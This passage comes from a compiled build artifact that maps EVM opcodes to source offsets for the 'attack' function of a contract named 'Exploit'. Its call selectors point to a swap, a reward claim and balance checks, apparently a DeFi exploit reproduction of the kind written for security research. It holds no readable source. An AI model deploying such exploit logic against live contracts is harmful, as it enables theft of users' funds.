        4862,
        4926
      ],
      "op": "ADD",
      "path": "0"
    },
    "3772": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3773": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3775": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3776": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "POP",
      "path": "0"
    },
    "3777": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3778": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "ADD",
      "path": "0"
    },
    "3779": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3780": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xECD"
    },
    "3783": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3784": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3785": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14DF"
    },
    "3788": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        4862,
        4926
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3789": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3790": {
      "op": "POP"
    },
    "3791": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4965
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 18,
      "value": "0x10"
    },
    "3793": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4965
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3794": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3796": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3797": {
      "op": "PUSH4",
      "value": "0x22C0D9F"
    },
    "3802": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3804": {
      "op": "SHL"
    },
    "3805": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3806": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3807": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3809": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3810": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "ADD",
      "path": "0"
    },
    "3811": {
      "op": "DUP4"
    },
    "3812": {
      "op": "SWAP1"
    },
    "3813": {
      "op": "MSTORE"
    },
    "3814": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4965
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3816": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3818": {
      "op": "DUP3"
    },
    "3819": {
      "op": "ADD"
    },
    "3820": {
      "op": "DUP2"
    },
    "3821": {
      "op": "SWAP1"
    },
    "3822": {
      "op": "MSTORE"
    },
    "3823": {
      "fn": "Exploit.attack",
      "offset": [
        4994,
        4998
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "3824": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "3826": {
      "op": "DUP4"
    },
    "3827": {
      "op": "ADD"
    },
    "3828": {
      "op": "MSTORE"
    },
    "3829": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "3831": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "3833": {
      "op": "DUP4"
    },
    "3834": {
      "op": "ADD"
    },
    "3835": {
      "op": "MSTORE"
    },
    "3836": {
      "op": "PUSH1",
      "value": "0x84"
    },
    "3838": {
      "op": "DUP3"
    },
    "3839": {
      "op": "ADD"
    },
    "3840": {
      "op": "MSTORE"
    },
    "3841": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3843": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3845": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3847": {
      "op": "SHL"
    },
    "3848": {
      "op": "SUB"
    },
    "3849": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4965
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3850": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4965
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3851": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4965
      ],
      "op": "AND",
      "path": "0"
    },
    "3852": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4965
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3853": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4970
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x22C0D9F"
    },
    "3858": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        4970
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3859": {
      "op": "PUSH1",
      "value": "0xA4"
    },
    "3861": {
      "op": "ADD"
    },
    "3862": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3864": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3866": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3867": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3868": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3869": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "SUB",
      "path": "0"
    },
    "3870": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3871": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3873": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP8",
      "path": "0"
    },
    "3874": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3875": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "3876": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3877": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3878": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3879": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xF2F"
    },
    "3882": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3883": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3885": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3886": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3887": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3888": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "POP",
      "path": "0"
    },
    "3889": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "GAS",
      "path": "0"
    },
    "3890": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "CALL",
      "path": "0"
    },
    "3891": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3892": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3893": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3894": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xF43"
    },
    "3897": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3898": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3899": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3901": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3902": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3903": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3904": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3906": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3907": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3908": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "POP",
      "path": "0"
    },
    "3909": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "POP",
      "path": "0"
    },
    "3910": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "POP",
      "path": "0"
    },
    "3911": {
      "fn": "Exploit.attack",
      "offset": [
        4936,
        5004
      ],
      "op": "POP",
      "path": "0"
    },
    "3912": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 19,
      "value": "0x7"
    },
    "3914": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3916": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3917": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3918": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3919": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x100"
    },
    "3922": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "EXP",
      "path": "0"
    },
    "3923": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3924": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "DIV",
      "path": "0"
    },
    "3925": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3927": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3929": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3931": {
      "op": "SHL"
    },
    "3932": {
      "op": "SUB"
    },
    "3933": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5041
      ],
      "op": "AND",
      "path": "0"
    },
    "3934": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3936": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3938": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3940": {
      "op": "SHL"
    },
    "3941": {
      "op": "SUB"
    },
    "3942": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5051
      ],
      "op": "AND",
      "path": "0"
    },
    "3943": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5051
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x3D18B912"
    },
    "3948": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3950": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3951": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3952": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "3957": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "AND",
      "path": "0"
    },
    "3958": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "3960": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "SHL",
      "path": "0"
    },
    "3961": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3962": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3963": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3965": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "ADD",
      "path": "0"
    },
    "3966": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3968": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3970": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3971": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3972": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3973": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "SUB",
      "path": "0"
    },
    "3974": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3975": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3977": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP8",
      "path": "0"
    },
    "3978": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3979": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "3980": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3981": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3982": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3983": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xF97"
    },
    "3986": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3987": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3989": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3990": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3991": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3992": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "POP",
      "path": "0"
    },
    "3993": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "GAS",
      "path": "0"
    },
    "3994": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "CALL",
      "path": "0"
    },
    "3995": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3996": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3997": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3998": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xFAB"
    },
    "4001": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4002": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4003": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4005": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4006": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4007": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4008": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4010": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4011": {
      "fn": "Exploit.attack",
      "offset": [
        5015,
        5053
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4012": {
      "op": "POP"
    },
    "4013": {
      "op": "POP"
    },
    "4014": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5089
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "4016": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5089
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4017": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5089
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "4018": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4020": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4021": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "4026": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "4028": {
      "op": "SHL"
    },
    "4029": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4030": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4031": {
      "fn": "Exploit.attack",
      "offset": [
        5108,
        5112
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "4032": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "4033": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4034": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "ADD",
      "path": "0"
    },
    "4035": {
      "op": "SWAP3"
    },
    "4036": {
      "op": "SWAP1"
    },
    "4037": {
      "op": "SWAP3"
    },
    "4038": {
      "op": "MSTORE"
    },
    "4039": {
      "fn": "Exploit.attack",
      "offset": [
        5064,
        5081
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4041": {
      "fn": "Exploit.attack",
      "offset": [
        5064,
        5081
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "4042": {
      "op": "POP"
    },
    "4043": {
      "fn": "Exploit.attack",
      "offset": [
        5117,
        5118
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "4045": {
      "fn": "Exploit.attack",
      "offset": [
        5117,
        5118
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "4046": {
      "op": "POP"
    },
    "4047": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4049": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "4051": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "4053": {
      "op": "SHL"
    },
    "4054": {
      "op": "SUB"
    },
    "4055": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5089
      ],
      "op": "AND",
      "path": "0"
    },
    "4056": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5089
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4057": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5099
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "4062": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5099
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4063": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "4065": {
      "op": "ADD"
    },
    "4066": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "4068": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4070": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4071": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4072": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP4",
      "path": "0"
    },
    "4073": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "SUB",
      "path": "0"
    },
    "4074": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4075": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4077": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP8",
      "path": "0"
    },
    "4078": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "GAS",
      "path": "0"
    },
    "4079": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "CALL",
      "path": "0"
    },
    "4080": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4081": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4082": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "4083": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1000"
    },
    "4086": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "4087": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4088": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4090": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4091": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "4092": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4093": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "4095": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "REVERT",
      "path": "0"
    },
    "4096": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "4097": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "POP",
      "path": "0"
    },
    "4098": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "POP",
      "path": "0"
    },
    "4099": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "POP",
      "path": "0"
    },
    "4100": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "POP",
      "path": "0"
    },
    "4101": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4103": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "4104": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "4105": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4107": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "NOT",
      "path": "0"
    },
    "4108": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "4110": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4111": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "ADD",
      "path": "0"
    },
    "4112": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "AND",
      "path": "0"
    },
    "4113": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP3",
      "path": "0"
    },
    "4114": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "ADD",
      "path": "0"
    },
    "4115": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP1",
      "path": "0"
    },
    "4116": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4118": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "4119": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "POP",
      "path": "0"
    },
    "4120": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "DUP2",
      "path": "0"
    },
    "4121": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "ADD",
      "path": "0"
    },
    "4122": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4123": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1024"
    },
    "4126": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "4127": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "4128": {
      "fn": "Exploit.attack",
      "offset": [
        5084,
        5114
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14C6"
    },
    "4131": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        5084,
        5114
      ],
      "op": "JUMP",
      "path": "0"
    },
